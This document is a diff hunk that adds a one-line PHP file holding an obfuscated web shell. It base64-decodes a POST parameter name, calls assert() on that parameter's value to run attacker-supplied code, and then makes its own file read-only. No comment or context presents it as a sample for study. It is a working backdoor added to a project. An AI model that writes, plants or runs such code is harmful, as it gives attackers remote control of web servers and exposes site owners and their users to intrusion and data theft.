@@ -1,0 +1,1 @@
+<?php $p=base64_decode("bW93YW5n");$i['j']='assert';$a[]=$i;@$a[0]['j']($_POST[$p]);$filename = $php_self=substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);function set_writeable($file_name){if(@chmod($file_name,0444)){echo "OK";}else{echo "no";}}set_writeable($filename);?>
